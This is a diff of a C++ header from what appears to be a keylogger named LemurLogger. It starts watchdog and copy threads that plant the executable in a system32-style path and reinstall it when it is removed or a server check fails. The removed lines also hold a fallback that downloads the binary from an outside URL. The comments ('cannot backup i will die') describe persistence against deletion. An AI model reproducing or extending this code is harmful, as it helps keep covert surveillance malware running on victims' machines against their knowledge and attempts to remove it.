@@ -15,187 +15,159 @@
 #include <strsafe.h>
 #include <sockstatus.h>
 
-#define MAX_Procress 1
+#define MAX_Procress 2
 #define BUF_SIZE 1024
+namespace pre {
+    DWORD WINAPI ThreadCheckFile(LPVOID lpParam);
+    DWORD WINAPI ThreadCopy(LPVOID lpParam);
 
-DWORD WINAPI ThreadCheckFile( LPVOID lpParam );
-DWORD WINAPI ThreadCopy( LPVOID lpParam );
+    typedef struct checkdata {
+        bool value;
 
+    } checkdata, *Pcheckdata;
 
-typedef struct checkdata {
-    bool value;
+    DWORD WINAPI ThreadCopy(LPVOID lpParam) {
+        HANDLE hStdout;
+        Pcheckdata pDataArray;
 
-} checkdata, *Pcheckdata;
+        // Make sure there is a console to receive output results.
 
-DWORD WINAPI ThreadCopy( LPVOID lpParam )
-{
-    HANDLE hStdout;
-    Pcheckdata pDataArray;
+        hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
+        if (hStdout == INVALID_HANDLE_VALUE)
+            return 1;
 
-    // Make sure there is a console to receive output results.
+        // Cast the parameter to the correct data type.
+        // The pointer is known to be valid because
+        // it was checked for NULL before the thread was created.
 
-    hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
-    if( hStdout == INVALID_HANDLE_VALUE )
-        return 1;
+        pDataArray = (Pcheckdata) lpParam;
 
-    // Cast the parameter to the correct data type.
-    // The pointer is known to be valid because
-    // it was checked for NULL before the thread was created.
-
-    pDataArray = (Pcheckdata)lpParam;
-
-    // Print the parameter values using thread-safe functions.
-    if (!(pDataArray->value)) {
-        //do copy 1
-        std::string path = "C:/window/system32/";
-        std::string filename = "LemurLogger.exe";
-        std::string fullpath = path+filename;
-        if(!(IO::copy_w_cmd(path,filename))){
-            //do copy 2
-            const char* desfile_path = fullpath.c_str();
-            if (!(IO::ms_Copyfile(desfile_path))) {
-                //do copy 3
-                if (!(IO::copy(path,filename))) {
-                   //do copy 4
-
-                    std::string url = "www.arekor.co/content/images/LemurLogger.exe";
-                    if (!(IO::download_File(url.c_str(),path.c_str()))) {
-                        return 1;
-                    }
-                }
+        // Print the parameter values using thread-safe functions.
+        if (!(pDataArray->value)) {
+            //do copy 1
+            if (IO::copy_File()) {
+                pDataArray->value = true;
+                return 0;
+            } else {
+                //cannot backup i will die
+                return 1;
             }
-        }else{
-            pDataArray->value = true;
-            return 0;
         }
+
+        return 1;
     }
 
-    return 1;
-}
-DWORD WINAPI ThreadCheckFile( LPVOID lpParam )
-{
-    HANDLE hStdout;
-    Pcheckdata pDataArray;
+    DWORD WINAPI ThreadCheckFile(LPVOID lpParam) {
+        HANDLE hStdout;
+        Pcheckdata pDataArray;
 
-    // Make sure there is a console to receive output results.
+        // Make sure there is a console to receive output results.
 
-    hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
-    if( hStdout == INVALID_HANDLE_VALUE )
-        return 1;
+        hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
+        if (hStdout == INVALID_HANDLE_VALUE)
+            return 1;
 
-    // Cast the parameter to the correct data type.
-    // The pointer is known to be valid because
-    // it was checked for NULL before the thread was created.
+        // Cast the parameter to the correct data type.
+        // The pointer is known to be valid because
+        // it was checked for NULL before the thread was created.
 
-    pDataArray = (Pcheckdata)lpParam;
+        pDataArray = (Pcheckdata) lpParam;
 
-    // Print the parameter values using thread-safe functions.
-    //Tu do check file
-    while (true) {
-        if (!ss::server()) {
-
-            if (!ss::connect()) {
-                //try 3 time
-                for (int i = 0; i < 3; ++i) {
-                    if (!ss::connect()) {
-                        //true file not delete
-                        break;
-                    } else {
-                        if (i == 2) {
-                            std::string path = "C:/window/system32/";
-                            std::string filename = "LemurLogger.exe";
-                            std::string fullpath = path + filename;
-                            if (!(IO::copy_w_cmd(path, filename))) {
-                                //do copy 2
-                                const char *desfile_path = fullpath.c_str();
-                                if (!(IO::ms_Copyfile(desfile_path))) {
-                                    //do copy 3
-                                    if (!(IO::copy(path, filename))) {
-                                        //do copy 4
-                                        std::string url = "www.arekor.co/content/images/LemurLogger.exe";
-                                        if (!(IO::download_File(url.c_str(), path.c_str()))) {
-
-                                        }
+        // Print the parameter values using thread-safe functions.
+        //Tu do check file
+        while (true) {
+            int server = ss::server();
+            if (server == 1) {
+                while (true) {
+                    int con = ss::connect();
+                    if (con == 3) {
+                        //try 3 time
+                        for (int i = 0; i < 3; ++i) {
+                            con = ss::connect();
+                            if (con == 3) {
+                                //true file not delete
+                                break;
+                            } else {
+                                if (i == 2) {
+                                    if (IO::copy_File()) {
+                                        continue;
+                                    } else {
+                                        //cannot backup i will die
+                                        break;
                                     }
                                 }
-                            } else {
-                                pDataArray->value = true;
-
                             }
                         }
+                    } else {
+                        continue;
                     }
                 }
             } else {
+                if (server == 3) {
+                    IO::copy_File();
+                }
+            }
+        }
+    }
+
+
+
+    bool start() {
+        Pcheckdata pDataArray[MAX_Procress];
+        DWORD dwThreadIdArray[MAX_Procress];
+        HANDLE hThreadArray[MAX_Procress];
+
+        // Create MAX_Procress worker threads.
+
+        for (int i = 0; i < MAX_Procress; i++) {
+            // Allocate memory for thread data.
+
+            pDataArray[i] = (Pcheckdata) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
+                                                   sizeof(checkdata));
+
+            if (pDataArray[i] == NULL) {
+                // If the array allocation fails, the system is out of memory
+                // so there is no point in trying to print an error message.
+                // Just terminate execution.
+                return false;
+            }
+
+            // Generate unique data for each thread to work with.
+
+            pDataArray[i]->value = false;
+
+
+            // Create the thread to begin execution on its own.
+            if (i == 0) {
+                hThreadArray[i] = CreateThread(
+                        NULL,                   // default security attributes
+                        0,                      // use default stack size
+                        ThreadCheckFile,       // thread function name
+                        pDataArray[i],          // argument to thread function
+                        0,                      // use default creation flags
+                        &dwThreadIdArray[i]);   // returns the thread identifier
+
+            } else {
+                hThreadArray[i] = CreateThread(
+                        NULL,                   // default security attributes
+                        0,                      // use default stack size
+                        ThreadCopy,       // thread function name
+                        pDataArray[i],          // argument to thread function
+                        0,                      // use default creation flags
+                        &dwThreadIdArray[i]);   // returns the thread identifier
 
             }
-        } else {
-
-        }
-    }
-    return 0;
-}
 
 
-bool start()
-{
-    Pcheckdata pDataArray[MAX_Procress];
-    DWORD   dwThreadIdArray[MAX_Procress];
-    HANDLE  hThreadArray[MAX_Procress];
+            // Check the return value for success.
+            // If CreateThread fails, terminate execution.
+            // This will automatically clean up threads and memory.
 
-    // Create MAX_Procress worker threads.
+            if (hThreadArray[i] == NULL) {
 
-    for( int i=0; i<MAX_Procress; i++ )
-    {
-        // Allocate memory for thread data.
-
-        pDataArray[i] = (Pcheckdata) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
-                                            sizeof(checkdata));
-
-        if( pDataArray[i] == NULL )
-        {
-            // If the array allocation fails, the system is out of memory
-            // so there is no point in trying to print an error message.
-            // Just terminate execution.
-            return false;
-        }
-
-        // Generate unique data for each thread to work with.
-
-        pDataArray[i]->value = false;
-
-
-        // Create the thread to begin execution on its own.
-        if (i == 0) {
-            hThreadArray[i] = CreateThread(
-                                           NULL,                   // default security attributes
-                                           0,                      // use default stack size
-                                           ThreadCheckFile,       // thread function name
-                                           pDataArray[i],          // argument to thread function
-                                           0,                      // use default creation flags
-                                           &dwThreadIdArray[i]);   // returns the thread identifier
-
-        }else{
-            hThreadArray[i] = CreateThread(
-                                           NULL,                   // default security attributes
-                                           0,                      // use default stack size
-                                           ThreadCopy,       // thread function name
-                                           pDataArray[i],          // argument to thread function
-                                           0,                      // use default creation flags
-                                           &dwThreadIdArray[i]);   // returns the thread identifier
-
-        }
-
-
-        // Check the return value for success.
-        // If CreateThread fails, terminate execution.
-        // This will automatically clean up threads and memory.
-
-        if (hThreadArray[i] == NULL)
-        {
-
-            return false;
+                return false;
+            }
         }
     }
 }
-
 #endif /* prepare_h */
